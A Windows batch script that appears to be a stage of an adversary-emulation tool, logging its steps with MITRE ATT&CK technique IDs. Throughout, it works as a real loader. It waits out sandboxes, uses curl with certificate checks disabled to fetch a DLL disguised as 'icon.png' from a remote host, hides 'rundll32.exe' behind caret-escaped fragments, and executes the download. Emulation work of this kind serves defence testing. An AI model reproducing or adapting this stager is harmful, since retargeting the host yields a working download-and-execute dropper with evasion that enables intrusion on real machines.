@echo off
SETLOCAL EnableDelayedExpansion

SET xqwak=%APPDATA%\11048\8fd45440
SET mzops=65831f5d.txt
SET kdjfa=https://10.0.0.49/stage/2/icon.png?11048-7
SET lmnop=BALAM-S2BO
SET qrstu=11048
SET vwxyz=7
SET abcde=%PUBLIC%\\macula-simulations.log
SET fghij=https://10.0.0.49

SET ts=!DATE!/!TIME!
SET agent=!lmnop!
SET simid=!qrstu!
SET logfile=!abcde!

echo [!ts!][DEBUG][!agent!][!simid!]: heartbeat_start>> "!logfile!" 2>nul
timeout /t 15 /nobreak >nul
curl -k -s -o "!xqwak!\!mzops!" "!kdjfa!"
SET hb_el=!errorlevel!
IF !hb_el! EQU 0 (SET hb_res=OK) ELSE (SET hb_res=FAIL)
echo [!ts!][DEBUG][!agent!][!simid!]: heartbeat_complete>> "!logfile!" 2>nul
echo [!ts!][DEBUG][!agent!][!simid!]: heartbeat_result=!hb_el!>> "!logfile!" 2>nul

IF !hb_el! NEQ 0 (
    echo [!ts!][DEBUG][!agent!][!simid!]: heartbeat_abort=no_dll>> "!logfile!" 2>nul
    goto :done
)

SET dll_size=0
FOR %%I IN ("!xqwak!\!mzops!") DO SET dll_size=%%~zI
IF !dll_size! LSS 1024 (
    echo [!ts!][DEBUG][!agent!][!simid!]: dll_size_fail=!dll_size!>> "!logfile!" 2>nul
    goto :done
)
echo [!ts!][DEBUG][!agent!][!simid!]: dll_size_ok=!dll_size!>> "!logfile!" 2>nul

ping -n 9 127.0.0.1 >nul
SET /A anty_delay=%RANDOM% %% 20 + 10
timeout /t !anty_delay! /nobreak >nul

echo [!ts!][TTP][!agent!][!simid!]: T1497^|Virtualization/Sandbox Evasion=OK>> "!logfile!" 2>nul
echo [!ts!][DEBUG][!agent!][!simid!]: chdir_start>> "!logfile!" 2>nul
cd /d "!xqwak!" >nul 2>&1
echo [!ts!][DEBUG][!agent!][!simid!]: chdir_result=!errorlevel!>> "!logfile!" 2>nul

SET lol1=ru^nd^ll
SET lol2=3^2.e^x^e
SET lolbin=!lol1!!lol2!
SET entry=R^u^n^D^L^L^W
echo [!ts!][DEBUG][!agent!][!simid!]: rundll32_start>> "!logfile!" 2>nul
!lolbin! "!xqwak!\!mzops!", !entry!
SET rdl_el=!errorlevel!
echo [!ts!][DEBUG][!agent!][!simid!]: rundll32_result=!rdl_el!>> "!logfile!" 2>nul
IF !rdl_el! EQU 0 (SET rdl_res=OK) ELSE (SET rdl_res=FAIL)
echo [!ts!][TTP][!agent!][!simid!]: T1218^|System Binary Proxy Execution=!rdl_res!>> "!logfile!" 2>nul
echo [!ts!][TTP][!agent!][!simid!]: T1027^|Obfuscated Files or Information=OK>> "!logfile!" 2>nul

:done
ENDLOCAL
